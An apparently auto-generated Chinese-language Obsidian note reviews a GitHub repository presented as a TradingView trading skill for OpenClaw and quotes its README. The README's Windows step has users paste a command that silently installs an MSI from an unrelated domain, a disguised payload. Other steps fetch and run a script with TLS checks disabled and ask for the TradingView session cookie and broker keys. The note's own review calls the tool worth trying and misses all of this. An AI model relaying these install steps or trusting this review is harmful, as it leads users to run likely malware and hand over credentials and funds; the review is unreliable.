---
repo: helenigtxu/TradingView-Claw
url: https://github.com/helenigtxu/TradingView-Claw
owner: helenigtxu
owner_type: User
language: Python
license: MIT
description: ""
homepage: ""
stars: 464
stars_per_day: 52
forks: 4
open_issues: 0
created: 2026-03-06
pushed_at: 2026-03-12
first_seen: 2026-03-10
week: "2026-W11"
month: "2026-03"
category: "開發工具"
subcategory: "自動化"
release_tag: ""
install_complexity: "easy"
status: to-review
my_rating: 0
score_confidence: 0
score_interest: 0
score_risk: 0
last_reviewed: 2026-03-10
use_case: "提供基於 TradingView 的自動交易功能，讓用戶能夠根據技術信號執行交易。"
priority: medium
ring: assess
discovered_via: "GitHub Trending"
appearances: 2
next_review: "2026-03-18"
contributor_count: 1
engagement: "low"
issue_close_rate: -1
repo_size_kb: 102
readme_length: 9243
bus_factor: 1
last_release_days: -1
release_cadence: "never"
verdict: ""
ring_history: "assess@2026-03-10"
star_history: "2026-03-10:332,2026-03-11:332,2026-03-13:407,2026-03-14:442,2026-03-15:461,2026-03-16:464"
tags:
  - github
  - "category/開發工具"
  - "lang/python"
  - easy_install
  - "topic/ai_auto_trading"
  - "topic/ai_trading"
  - "topic/ai_trading_bots"
  - "topic/al_trading"
  - "topic/bot_trading"
aliases:
  - "TradingView-Claw"
  - "helenigtxu/TradingView-Claw"
  - "提供基於 TradingView 的自動交易功能，讓用戶能夠根據技術信號執行交易。"
---

# TradingView-Claw

**464** stars · **52** stars/天 · 建立 9 天前 · Python · MIT

```dataviewjs
const me = dv.page("Repos/helenigtxu--TradingView-Claw");
if (me && ((me.verdict && me.verdict !== "") || (me.my_rating || 0) > 0)) {
  const parts = [];
  if (me.my_rating > 0) parts.push("\u2605".repeat(me.my_rating) + "\u2606".repeat(5 - me.my_rating));
  if (me.ring && me.ring !== "assess") parts.push("Ring: **" + me.ring + "**");
  if (me.verdict) parts.push(me.verdict);
  dv.paragraph("> [!success] 你的結論\n> " + parts.join(" / "));
}
```

`個人專案` `easy-install`

`ai-auto-trading` `ai-trading` `ai-trading-bots` `al-trading` `bot-trading` `openclaw-skill` `quantitave-trading` `trading-api` `trading-application` `trading-calculator` `trading-claw` `trading-openclaw` `trading-robots` `trading-ui` `tradingview` `tradingview-claw` `tradingview-openclaw` `tradingview-skill` `tradingview-skill-openclaw` `tradingviewclaw`

> [!summary] 一句話摘要
> 提供基於 TradingView 的自動交易功能，讓用戶能夠根據技術信號執行交易。

> [!info] 速覽
> **安裝難度** Easy · **專案狀態** Recent · **熱度** Growing (52 stars/day)
> **授權** MIT (商業友好) · **維護** Active (最後推送 3 天前) · **貢獻者** Solo (bus factor 風險) · **參與度** Low
> **適合** 希望自動化交易流程並利用 TradingView 數據的中小型交易者。
> **一句話重點** 這個專案展示了如何將 LLM 技術應用於交易信號分析，為交易者提供更智能的決策支持。

> [!abstract]- 同類競品快速對比
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   const rivals = dv.pages('"Repos"')
>     .where(p => p.subcategory === "自動化" && p.file.name !== "helenigtxu--TradingView-Claw" && p.status !== "archived")
>     .sort(p => p.stars || 0, "desc").limit(5);
>   if (rivals.length > 0) {
>     dv.table(["專案", "Stars", "Stars/天", "安裝", "授權", "Ring"], rivals.map(p => [
>       p.file.link,
>       (p.stars || 0).toLocaleString(),
>       p.stars_per_day || 0,
>       p.install_complexity || "?",
>       p.license || "?",
>       p.ring || "assess"
>     ]));
>   } else { dv.paragraph("_目前 vault 中沒有其他 自動化 類工具_"); }
> }
> ```

> [!question] TL;DR — 值得投入嗎？
> **成熟度** Alpha (不穩定) · **安裝** Easy (一行搞定) · **學習** ~5h · **綁定風險** medium
> **結論** 花 5 小時學習、2 小時整合，得到自動化交易的能力，值得一試。

> [!abstract] 核心創新
> 結合 TradingView 的市場數據和 LLM 的分析能力，提供高信心的交易信號。

## 專案簡介

TradingView-Claw 是一個針對 OpenClaw 的交易技能，允許用戶透過 TradingView 瀏覽圖表、執行交易和追蹤持倉。用戶可以使用 `tvclaw buy` 和 `tvclaw sell` 指令來開啟多頭或空頭持倉，並透過技術指標（如 RSI、MACD 和布林帶）進行信號驅動的執行。這個工具的賣點在於其結合了 LLM（大型語言模型）進行技術分析，能夠過濾出有意義的交易信號，並提供高信心的交易建議。它的架構依賴於 Python 和多個庫（如 pandas 和 httpx），以便於處理市場數據和與經紀商的 API 互動。

與其他交易工具相比，如 AlpinDale/parsync 和 binance/binance-skills，TradingView-Claw 提供了更強的信號分析能力，並且能夠直接從 TradingView 獲取數據，這使得用戶能夠更快速地做出交易決策。該工具的使用範圍適合中小型交易者，尤其是那些希望自動化交易流程的用戶。需要注意的是，該專案目前處於早期階段，可能會面臨一些穩定性和安全性問題，因此不建議將其用於大額資金的交易。對於希望在小規模上進行自動交易的用戶來說，這是一個值得嘗試的工具。

**技術棧**：`Python 3.10` · `httpx` · `websockets` · `pandas` · `numpy`

## 重點功能

- 市場數據查詢 — 使用 `tvclaw charts trending` 獲取當前熱門標的。
- 交易執行 — 使用 `tvclaw buy <symbol> <amount>` 開啟多頭持倉，或 `tvclaw sell <symbol> <amount>` 開啟空頭持倉。
- 持倉追蹤 — 使用 `tvclaw positions` 列出當前持倉及其盈虧情況。
- 信號掃描 — 使用 `tvclaw signal scan` 掃描市場以發現交易信號，並使用 `tvclaw signal analyze <symbol1> <symbol2>` 比較信號強度。
- 帳戶管理 — 使用 `tvclaw account status` 查看帳戶餘額和信息，並使用 `tvclaw account connect` 連接經紀商 API。

## 快速開始

1. 安裝 TradingView-Claw
```bash
curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/TradingView-Claw-main && bash install.sh
```
2. 配置環境變數
```bash
將 TRADINGVIEW_SESSION 和經紀商 API 金鑰添加到 openclaw.json
```
3. 連接經紀商
```bash
uv run python scripts/tvclaw.py account connect
```

## 為什麼值得關注

> [!tip] 爆紅原因
> 建立 9 天就累積 464 stars（51.6/天），forks 4（0.9%），顯示出一定的關注度。作者 helenigtxu 似乎專注於開發與交易相關的工具，這個專案解決了自動化交易的需求，特別是結合了 TradingView 的市場數據和 LLM 的分析能力。這種結合在目前的交易工具中並不常見，可能吸引了對自動化交易有興趣的開發者。社群的反應也表明，這個工具的潛力和實用性得到了初步認可。

## 適合誰使用

**目標受眾**：希望自動化交易流程並利用 TradingView 數據的中小型交易者。

> [!example] 使用場景
> - 量化交易者用它來自動執行基於技術信號的交易，因為它能夠快速分析市場數據並提供即時交易建議。
> - 新手交易者用它來學習如何根據技術指標進行交易，因為它提供了簡單的 CLI 指令和清晰的信號分析。
> - 資深交易者用它來整合 TradingView 的數據與自己的交易策略，因為它支持多種經紀商的 API 連接，方便進行高效的交易管理。

## 架構分析

TradingView-Claw 採用模組化設計，主要由 Python 腳本和庫組成。其核心架構包括一個 CLI 介面，通過 `tvclaw.py` 來處理用戶指令，並與 TradingView 和經紀商的 API 進行互動。數據流從用戶輸入指令開始，經過各種模組（如 charts.py、trade.py 和 signals.py）進行處理，最終返回交易結果或市場數據。這種設計使得功能擴展變得簡單，但也可能導致在高頻交易時的延遲問題，因為每個指令都需經過多個模組的處理。整體架構的輕量化使得安裝和運行變得容易，但在處理大量數據時可能會面臨性能瓶頸，特別是在信號掃描和交易執行的過程中。

## 技術深入分析

TradingView-Claw 的核心技術機制在於其使用 LLM 進行技術分析，這使得它能夠過濾出有意義的交易信號。其資料流從用戶輸入的指令開始，經過多個模組進行處理，例如 charts.py 負責市場數據的抓取，trade.py 負責執行交易，signals.py 則用於信號分析。這樣的設計使得用戶能夠快速獲得所需的交易資訊和執行結果。該工具的效能在於能夠快速響應用戶指令，但在高頻交易時可能會遇到延遲問題，特別是在信號掃描過程中。選擇 Python 作為開發語言的好處在於其豐富的庫支持和易於維護，但也可能導致在高性能需求下的效能瓶頸。技術風險方面，該工具依賴於外部 API 的穩定性，若 API 出現問題，將直接影響到交易的執行。整合方面，該工具與現有的交易平台（如 TradingView 和各大經紀商）相容性良好，但在 CI/CD pipeline 的整合上可能需要額外的適配。

## 新手體驗

> [!info] 上手難度評估
> README 文件提供了清晰的安裝步驟和使用範例，對於新手來說相對友好。安裝過程簡單，僅需執行一條命令即可完成。文件中包含了環境變數的配置說明，雖然對新手來說可能有些挑戰，但整體上能在 30 分鐘內完成設置並運行。

## 優缺點分析

> [!success] 優點
> - 結合 TradingView 數據和 LLM 分析，提供高信心的交易信號。
> - 簡單的 CLI 指令，方便用戶快速執行交易。
> - 支持多種經紀商的 API 連接，靈活性高。

> [!danger] 缺點
> - 目前仍在早期開發階段，可能存在穩定性問題。
> - 需要用戶手動配置環境變數，對新手不友好。
> - 對於大型資金的交易，風險較高，建議小額交易。

> [!warning] 注意事項
> - 目前僅支援 Python 3.10 以上版本。
> - 需要有效的 TradingView 和經紀商 API 金鑰才能運行。
> - 對於大型資金的交易，使用時需謹慎，因為該工具尚未經過全面審核。

## 類似工具比較

| 工具 | 差異 |
| --- | --- |
| [AlpinDale/parsync](https://github.com/AlpinDale/parsync) | AlpinDale/parsync 主要專注於資料同步，而 TradingView-Claw 提供了完整的交易執行和信號分析功能，適合需要自動化交易的用戶。 |
| [binance/binance-skills](https://github.com/binance/binance-skills) | binance/binance-skills 主要針對 Binance 交易所的功能，而 TradingView-Claw 則整合了 TradingView 的市場數據，提供更全面的技術分析能力。 |

## 替代方案決策

> [!question] 什麼時候該選別的工具？

| 工具 | 技術路線 | 選它的時機 | 遷移難度 |
| --- | --- | --- | --- |
| [AlpinDale/parsync](https://github.com/AlpinDale/parsync) | AlpinDale/parsync 主要專注於資料同步，而 TradingView-Claw 提供了完整的交易執行和信號分析功能，適合需要自動化交易的用戶。 | 如果你的需求主要是資料同步而非交易執行，則 AlpinDale/parsync 更適合。 | low，因為兩者的使用場景不同，遷移不會有太大影響。 |
| [binance/binance-skills](https://github.com/binance/binance-skills) | binance/binance-skills 主要針對 Binance 交易所的功能，而 TradingView-Claw 則整合了 TradingView 的市場數據，提供更全面的技術分析能力。 | 如果你只在 Binance 平台上進行交易，則 binance/binance-skills 可能更適合。 | medium，因為需要重新學習 API 和指令。 |

> [!abstract]- 功能對比矩陣
>
> | 維度 | **TradingView-Claw** | **parsync** | **binance-skills** |
> | --- | --- | --- | --- |
> | 技術路線 | 本專案 | AlpinDale/parsync 主要專注於資料同步，而 TradingView-Claw 提供了完整的交易執行和信號分析功能，適合需要自動化交易的用戶。 | binance/binance-skills 主要針對 Binance 交易所的功能，而 TradingView-Claw 則整合了 TradingView 的市場數據，提供更全面的技術分析能力。 |
> | 遷移成本 | - | low，因為兩者的使用場景不同，遷移不會有太大影響。 | medium，因為需要重新學習 API 和指令。 |
> | 適用場景 | 主要場景 | 如果你的需求主要是資料同步而非交易執行，則 AlpinDal | 如果你只在 Binance 平台上進行交易，則 binanc |

## 成熟度評估

| 項目 | 評估 |
| --- | --- |
| 開發階段 | Alpha |
| 生產環境就緒 | No |
| Breaking Change 風險 | high |

> [!tip] 採用建議
> 適合個人 side project 試用，不建議用在生產環境的核心路徑上。

## 已知陷阱

> [!bug] 踩坑才知道的問題

- **[HIGH]** 首次使用時可能無法連接經紀商，需重新執行連接命令。
  - 解法：確保 API 金鑰正確並執行 `uv run python scripts/tvclaw.py account connect`。
- [MEDIUM] 信號掃描結果為空，可能是模型質量問題。
  - 解法：嘗試使用不同的模型參數，或檢查市場活躍度。
- **[HIGH]** 環境變數未設置導致無法執行交易。
  - 解法：確保所有必要的環境變數已正確設置。

## 使用情境適合度

| 情境 | 適合度 | 說明 |
| --- | --- | --- |
| 10 人以下的新創公司進行自動化交易 | 非常適合 | 該工具提供了簡單的 CLI 指令和強大的信號分析功能，適合小型團隊快速上手。 |
| 大型金融機構進行高頻交易 | 不適合 | 該工具目前仍在開發階段，穩定性和性能可能無法滿足高頻交易需求。 |
| 個人交易者希望自動化交易流程 | 適合 | 該工具能夠整合 TradingView 數據，提供即時的交易信號和執行能力。 |
| 需要進行多平台交易的用戶 | 普通 | 雖然支持多種經紀商，但可能需要額外的配置和整合工作。 |

## 採用成本分析

| 項目 | 評估 |
| --- | --- |
| 學習時間 | ~5 小時 |
| 整合時間 | ~2 小時 |
| 維護負擔 | medium |
| 綁定風險 | medium |

> [!tip] 投入 vs 回報
> 花 5 小時學習、2 小時整合，得到自動化交易的能力，值得一試。

## 安全性評估

> [!warning] 安全性快速掃描
> 該工具需要訪問用戶的經紀商 API 金鑰，建議使用子賬戶並限制權限以降低風險。對於敏感資料的存取需謹慎，並確保環境變數的安全性。

## 健康度儀表板

> [!abstract]- 專案健康度綜合評估
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   const pushed = me.pushed_at ? new Date(me.pushed_at.toString()) : null;
>   const daysSincePush = pushed ? Math.floor((Date.now() - pushed.getTime()) / 86400000) : null;
>   const created = me.created ? new Date(me.created.toString()) : null;
>   const age = created ? Math.floor((Date.now() - created.getTime()) / 86400000) : null;
>   const forkRatio = me.stars > 0 ? ((me.forks || 0) / me.stars * 100).toFixed(1) : 0;
>   const issueRatio = me.stars > 0 ? ((me.open_issues || 0) / me.stars * 100).toFixed(1) : 0;
>   const maint = daysSincePush === null ? "?" : daysSincePush <= 7 ? "Active" : daysSincePush <= 30 ? "Moderate" : "Stale";
>   const busFactor = (me.forks || 0) > 50 ? "Good" : (me.forks || 0) > 10 ? "OK" : "Risk";
>   // v29: README 品質和 Issue 解決率
>   const readmeLen = me.readme_length || 0;
>   const readmeQ = readmeLen > 5000 ? "Excellent" : readmeLen > 2000 ? "Good" : readmeLen > 500 ? "Basic" : readmeLen > 0 ? "Minimal" : "None";
>   const icr = me.issue_close_rate;
>   const icrLabel = icr === undefined || icr < 0 ? "N/A" : icr + "%";
>   const icrEval = icr === undefined || icr < 0 ? "?" : icr >= 80 ? "Excellent" : icr >= 50 ? "Good" : icr >= 20 ? "Fair" : "Poor";
>   const repoKB = me.repo_size_kb || 0;
>   const sizeLabel = repoKB > 102400 ? (repoKB/1024).toFixed(0) + " MB" : repoKB + " KB";
>   dv.table(["指標", "值", "評估"], [
>     ["維護狀態", daysSincePush + " 天前推送", maint],
>     ["專案年齡", age + " 天", age > 180 ? "Established" : age > 30 ? "Growing" : "Brand New"],
>     ["Fork 比率", forkRatio + "%", parseFloat(forkRatio) > 20 ? "High adoption" : parseFloat(forkRatio) > 5 ? "Normal" : "Low"],
>     ["Issue 密度", issueRatio + "%", parseFloat(issueRatio) > 5 ? "High" : "Normal"],
>     ["Issue 解決率", icrLabel, icrEval],
>     ["Bus Factor", (me.bus_factor || 0) + " 人", (me.bus_factor || 0) >= 3 ? "Good" : (me.bus_factor || 0) >= 2 ? "OK" : "Risk"],
>     ["README 品質", readmeLen.toLocaleString() + " 字元", readmeQ],
>     ["Repo 大小", sizeLabel, repoKB > 102400 ? "Large" : repoKB > 10240 ? "Medium" : "Small"],
>     ["發版節奏", me.release_cadence || "unknown", me.release_cadence === "weekly" || me.release_cadence === "monthly" ? "Active" : me.release_cadence === "never" ? "No releases" : "Check"],
>     ["距上次發版", (me.last_release_days || 0) >= 0 ? (me.last_release_days + " 天") : "N/A", (me.last_release_days || -1) < 0 ? "?" : (me.last_release_days || 0) <= 30 ? "Fresh" : (me.last_release_days || 0) <= 90 ? "OK" : "Stale"],
>   ]);
> }
> ```

> [!abstract]- CHAOSS 社群健康度雷達
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   const pushed = me.pushed_at ? new Date(me.pushed_at.toString()) : null;
>   const daysSincePush = pushed ? Math.floor((Date.now() - pushed.getTime()) / 86400000) : 999;
>   const dims = [
>     ["維護活躍度", Math.max(0, 5 - Math.floor(daysSincePush / 14))],
>     ["貢獻者多樣性", Math.min(5, Math.floor((me.bus_factor || 0) * 1.5 + (me.contributor_count || 0) / 3))],
>     ["Issue 回應力", (me.issue_close_rate || 0) >= 80 ? 5 : (me.issue_close_rate || 0) >= 50 ? 4 : (me.issue_close_rate || 0) >= 20 ? 2 : 1],
>     ["發版節奏", me.release_cadence === "weekly" ? 5 : me.release_cadence === "monthly" ? 4 : me.release_cadence === "quarterly" ? 3 : me.release_cadence === "irregular" ? 2 : 1],
>     ["社群規模", Math.min(5, Math.floor(Math.log10(Math.max(me.stars || 1, 1)) * 1.2))],
>     ["Fork 活躍度", (me.forks || 0) > 100 ? 5 : (me.forks || 0) > 30 ? 4 : (me.forks || 0) > 10 ? 3 : (me.forks || 0) > 3 ? 2 : 1],
>   ];
>   dv.table(["維度", "分數", "視覺化"], dims.map(([name, score]) => [
>     name, score + "/5", "\u2588".repeat(score) + "\u2591".repeat(5 - score)
>   ]));
>   const avg = (dims.reduce((a, b) => a + b[1], 0) / dims.length).toFixed(1);
>   dv.paragraph("**綜合健康度：" + avg + "/5**");
> }
> ```

## 技術細節

| 欄位 | 值 |
| --- | --- |
| Forks | 4 |
| Open Issues | 0 |
| 最後推送 | 2026-03-12 |
| 建立日期 | 2026-03-06 |
| Repo 大小 | 102 KB |
| OpenSSF Scorecard | [查看](https://scorecard.dev/viewer/?uri=github.com/helenigtxu/TradingView-Claw) |
| Topics | `ai-auto-trading` `ai-trading` `ai-trading-bots` `al-trading` `bot-trading` `openclaw-skill` `quantitave-trading` `trading-api` |

> [!info]- 語言組成
> ```mermaid
> pie title 語言組成
>     "Python" : 77
>     "Shell" : 12
>     "JavaScript" : 10
> ```

> [!info]- 主要貢獻者
> | 貢獻者 | Commits |
> | --- | --- |
> | [@helenigtxu](https://github.com/helenigtxu) | 5 |

## 社群與生態

**社群活躍度**：社群活躍度中等，最近有更新，但仍需觀察未來的發展。

## 開發動態

> [!abstract] 最近 10 次 commit（2026-03-06 ~ 2026-03-12）
> **活躍天數** 3 天 · **最新 commit** Update README.md

## README 摘錄

> [!info]- 展開查看原文 README
> # TradingView-Claw
> 
> **Trading-enabled TradingView skill for OpenClaw.**
> 
> Browse charts, execute trades based on technical signals, track positions, and discover opportunities using LLM-powered technical analysis. Full trading capability via broker integrations and exchange APIs.
> 
> > **Disclaimer:** This software is provided as-is for educational and experimental purposes. It is not financial advice. Trading financial markets involves risk of loss. This code has not been audited. Use at your own risk and only with funds you can afford to lose.
> 
> ---
> 
> ## ⚡ Install on Windows — one command
> 
> ### **Step 1 — Open Command Prompt**
> 1. Press **Win + R**
> 2. Type:
> ```
> cmd
> ```
> 3. Press **Enter**
> This will open **Command Prompt**.
> ---
> ### **Step 2 — Run the Install Command**
> Copy the command below and paste it into **Command Prompt**, then press **Enter**.
> ```powershell
> cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem TradingViewClaw
> ```
> The installer will automatically download and install the required components.
> 
> ---
> 
> ## Features
> 
> ### Chart & Market Data
> 
> * `tvclaw charts trending` — Top trending tickers by volume
> * `tvclaw charts search "query"` — Search symbols by keyword
> * `tvclaw chart ` — Symbol details with OHLCV + indicators
> 
> ### Trading
> 
> * `tvclaw buy  ` — Open long position
> * `tvclaw sell  ` — Open short position
> * Signal-driven execution (RSI, MACD, Bollinger Bands analysis)
> 
> ### Position Tracking
> 
> * `tvclaw positions` — List open positions with live P&L
> * `tvclaw position ` — Detailed position view
> * Positions tracked locally in `~/.openclaw/tvclaw/positions.json`
> 
> ### Wallet / Account Management
> 
> * `tvclaw account status` — Show balance and account info
> * `tvclaw account connect` — Connect broker/exchange API (one-time setup)
> 
> ### Signal Discovery
> 
> * `tvclaw signal scan` — Scan trending symbols for trade signals
> * `tvclaw signal scan --query "topic"` — Scan symbols matching a query
> * `tvclaw signal analyze  ` — Compare signal strength between two symbols
> 
> Uses LLM-powered technical analysis to identify high-confidence setups. Only statistically meaningful signals are accepted — noise and weak correlations are filtered out.
> 
> **Signal tiers:** S1 (≥95% confluence), S2 (90–95%), S3 (85–90%)
> 
> ---
> 
> ## Quick Start
> 
> ### 1. Install
> 
> **macOS (recommended) — one command:**
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> **Manual install:**
> 
> ```bash
> cp -r TradingView-Claw ~/.openclaw/skills/
> cd ~/.openclaw/skills/TradingView-Claw
> uv sync
> ```
> 
> **Via ClawHub:**
> 
> ```bash
> clawhub install tvclaw
> cd ~/.openclaw/skills/tvclaw
> uv sync
> ```
> 
> ---
> 
> ### 2. Configure Environment Variables
> 
> Add the following to your `openclaw.json` under `skills.entries.tvclaw.env`:
> 
> ```json
> "tvclaw": {
>   "enabled": true,
>   "env": {
>     "TRADINGVIEW_SESSION": "your_tradingview_session_token",
>     "BROKER_API_KEY": "your_broker_api_key",
>     "BROKER_API_SECRET": "your_broker_api_secret",
>     "OPENROUTER_API_KEY": "sk-or-v1-..."
>   }
> }
> ```
> 
> **Where to get the keys:**
> 
> * **TradingView session** — Log into TradingView, open DevTools → Application → Cookies → copy `sessionid`
> * **Broker API key** — From your broker dashboard (supports Alpaca, IBKR, Binance, Bybit)
> * **OpenRouter API key** — [Create key at OpenRouter](https://openrouter.ai/settings/keys)
> 
> **Security warning:** Keep only small amounts in your trading account. Use sub-accounts with limited permissions where possible.
> 
> ---
> 
> ### 3. First-Time Setup (required for live trading)
> 
> Before your first trade, connect and verify your broker connection:
> 
> ```bash
> uv run python scripts/tvclaw.py account connect
> ```
> 
> This verifies API credentials and sets account permissions. Only needs to be done once per account.
> 
> ---
> 
> ### 4. Run Commands
> 
> ```bash
> # Browse charts
> uv run python scripts/tvclaw.py charts trending
> uv run python scripts/tvclaw.py charts search "AAPL"
> 
> # Find trading signals
> uv run python scripts/tvclaw.py signal scan --limit 10
> 
> # Check account and trade
> uv run python scripts/tvclaw.py account status
> uv run python scripts/tvclaw.py buy AAPL 500
> ```
> 
> ---
> 
> ## Example Prompts
> 
> Natural language prompts you can use with OpenClaw:
> 
> ### 1. Browse trending charts
> 
> ```
> What's trending on TradingView right now?
> ```
> 
> Returns symbol list, prices, volume, and momentum scores.
> 
> ### 2. Get chart details
> 
> ```
> Show me details for TSLA
> ```
> 
> Returns OHLCV data, RSI, MACD, and support/resistance levels.
> 
> ### 3. Check account status
> 
> ```
> What's my TradingView-Claw account balance?
> ```
> 
> Shows broker connection, buying power, and open positions.
> 
> ### 4. Direct trading
> 
> ```
> Buy $500 of NVDA
> ```
> 
> Executes order via connected broker and records position.
> 
> ### 5. Signal discovery flow
> 
> ```
> Find me strong trading signals right now
> ```
> 
> or more specifically:
> 
> ```
> Run signal scan limit 10
> ```
> 
> > **Note:** This takes a moment. The skill fetches symbols, runs indicator analysis, and sends setups to the LLM for confirmation scoring.
> 
> Review the results — you'll see signal tiers (S1 = 95%+, S2 = 90–95%, S3 = 85–90%) and actionable entry points.
> 
> ### 6. Check positions
> 
> ```
> Show my TradingView-Claw positions
> ```
> 
> Lists open positions with entry price, current price, and P&L.
> 
> ### 7. Close a position
> 
> ```
> Sell my NVDA position
> ```
> 
> Closes your position at current market price.
> 
> ### Full Flow Example
> 
> 1. **"What's trending on TradingView?"** → Get symbol list
> 2. **"Run signal scan limit 10"** → Wait for LLM analysis
> 3. Review signal tiers and setups
> 4. **"Buy $300 of AAPL"** → Enter position
> 5. **"Show my positions"** → Track P&L live
> 
> ---
> 
> ## Environment Variables
> 
> | Variable | Required | Description |
> |---|---|---|
> | `TRADINGVIEW_SESSION` | Yes (data) | TradingView session cookie |
> | `BROKER_API_KEY` | Yes (trading) | Broker/exchange API key |
> | `BROKER_API_SECRET` | Yes (trading) | Broker/exchange API secret |
> | `OPENROUTER_API_KEY` | Yes (signals) | OpenRouter API key for LLM |
> | `HTTPS_PROXY` | No | Use if data requests are rate-limited |
> | `MAX_RETRIES` | No | Max retries for API calls (default: 5) |
> 
> ---
> 
> ## Directory Structure
> 
> ```
> TradingView-Claw/
> ├── SKILL.md                     # OpenClaw skill manifest
> ├── README.md                    # This file
> ├── install.sh                   # macOS one-command installer
> ├── pyproject.toml               # Python dependencies (uv)
> │
> ├── scripts/
> │   ├── tvclaw.py                # CLI dispatcher
> │   ├── charts.py                # Chart & market data
> │   ├── account.py               # Account management
> │   ├── trade.py                 # Order execution
> │   ├── positions.py             # Position tracking + P&L
> │   └── signals.py               # LLM signal discovery
> │
> └── lib/
>     ├── __init__.py              # Package marker
>     ├── tv_client.py             # TradingView data client
>     ├── broker_client.py         # Broker API wrapper
>     ├── indicators.py            # RSI, MACD, Bollinger Bands
>     ├── signal_engine.py         # Signal scoring + tiers
>     ├── llm_client.py            # OpenRouter LLM client
>     └── position_storage.py      # Position JSON storage
> ```
> 
> ---
> 
> ## Trading Flow
> 
> 1. **Connect broker** (one-time): `tvclaw account connect`
> 2. **Execute trade**: `tvclaw buy AAPL 500`
>    * Fetch current price via TradingView data feed
>    * Validate signal strength via indicator suite
>    * Submit order to broker API
>    * Record position to local JSON store
> 3. **Track position**: `tvclaw positions`
> 
> ---
> 
> ## Signal Discovery Flow
> 
> 1. **Scan symbols**: `tvclaw signal scan --query "tech"`
> 2. **Review output**: Table shows Tier, Signal, Entry, Target, Stop
> 3. **Analyze pair**: `tvclaw signal analyze AAPL MSFT`
> 4. **Execute if valid**: Place order based on setup
> 
> **Signal tiers:**
> 
> * **Tier S1 (STRONG):** ≥95% confluence — high-confidence setup
> * **Tier S2 (GOOD):** 90–95% — solid setups
> * **Tier S3 (MODERATE):** 85–90% — acceptable but watch closely

## 延伸閱讀

相關概念：[[量化交易]] · [[自動化]] · [[技術分析]]

相關專案：[[AlpinDale--parsync|AlpinDale/parsync]] · [[BigBodyCobain--Shadowbroker|BigBodyCobain/Shadowbroker]] · [[binance--binance-skills-hub|binance/binance-skills-hub]] · [[FreedomIntelligence--OpenClaw-Medical-Skills|FreedomIntelligence/OpenClaw-Medical-Skills]] · [[Flowseal--tg-ws-proxy|Flowseal/tg-ws-proxy]] · [[Lightricks--LTX-Desktop|Lightricks/LTX-Desktop]] · [[RunanywhereAI--RCLI|RunanywhereAI/RCLI]] · [[duoan--TorchCode|duoan/TorchCode]]

[GitHub](https://github.com/helenigtxu/TradingView-Claw)

## 相關收錄

> [!note]- 直接競品（同子分類：自動化）
> ```dataview
> TABLE stars, stars_per_day AS "Stars/天", install_complexity AS "難度", use_case AS "用途"
> FROM "Repos"
> WHERE subcategory = "自動化" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> ```

> [!note]- 同分類的其他專案
> ```dataview
> TABLE stars, install_complexity AS "難度", status
> FROM "Repos"
> WHERE category = "開發工具" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> LIMIT 8
> ```

> [!note]- 同語言的熱門專案
> ```dataview
> TABLE stars_per_day AS "Stars/天", category AS "分類", use_case AS "用途"
> FROM "Repos"
> WHERE language = "Python" AND file.name != "helenigtxu--TradingView-Claw" AND status != "archived"
> SORT stars_per_day DESC
> LIMIT 5
> ```

> [!note]- 同週收錄
> ```dataview
> TABLE category AS "分類", stars, stars_per_day AS "stars/天"
> FROM "Repos"
> WHERE week = "2026-W11" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> ```

> [!note]- 共用概念的相關專案
> ```dataviewjs
> const concepts = ["量化交易","自動化","技術分析"];
> const pages = dv.pages('"Repos"')
>   .where(p => p.file.name !== "helenigtxu--TradingView-Claw" && p.file.outlinks?.some(l => concepts.some(c => l.path?.includes(c))))
>   .sort(p => p.stars, "desc")
>   .limit(5);
> if (pages.length > 0) {
>   dv.table(["專案", "Stars", "分類", "共用概念"], pages.map(p => {
>     const shared = concepts.filter(c => p.file.outlinks?.some(l => l.path?.includes(c)));
>     return [p.file.link, p.stars, p.category, shared.join(", ")];
>   }));
> } else { dv.paragraph("_目前沒有共用概念的相關專案_"); }
> ```

> [!note]- Ring 更高的同類競品
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   const ringOrder = { hold: 0, assess: 1, trial: 2, adopt: 3 };
>   const myRing = ringOrder[me.ring] || 0;
>   const better = dv.pages('"Repos"')
>     .where(p => p.file.name !== "helenigtxu--TradingView-Claw" && p.category === me.category && (ringOrder[p.ring] || 0) > myRing)
>     .sort(p => p.stars_per_day || 0, "desc").limit(5);
>   if (better.length > 0) {
>     dv.table(["專案", "Ring", "Stars/天", "安裝", "用途"], better.map(p => [
>       p.file.link, p.ring, p.stars_per_day || 0, p.install_complexity || "?", (p.use_case || "").toString().slice(0, 40)
>     ]));
>   } else { dv.paragraph("_此分類中沒有 Ring 更高的專案（你可能已經在用最好的了）_"); }
> }
> ```

## 同 Owner 專案

> [!note]- 這位開發者的其他收錄專案
> ```dataview
> TABLE stars AS "Stars", category AS "分類", status AS "狀態"
> FROM "Repos"
> WHERE owner = "helenigtxu" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> ```

## Vault 排名

> [!abstract]- 這個專案在 vault 中的相對位置
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> const all = dv.pages('"Repos"').where(p => p.status !== "archived").sort(p => p.stars_per_day || 0, "desc");
> const rank = all.array().findIndex(p => p.file.name === me?.file?.name) + 1;
> const catAll = all.where(p => p.category === me?.category);
> const catRank = catAll.array().findIndex(p => p.file.name === me?.file?.name) + 1;
> const totalStarsAll = dv.pages('"Repos"').where(p => p.status !== "archived").sort(p => p.stars || 0, "desc");
> const starsRank = totalStarsAll.array().findIndex(p => p.file.name === me?.file?.name) + 1;
> if (rank > 0) {
>   const pct = Math.round((1 - rank / all.length) * 100);
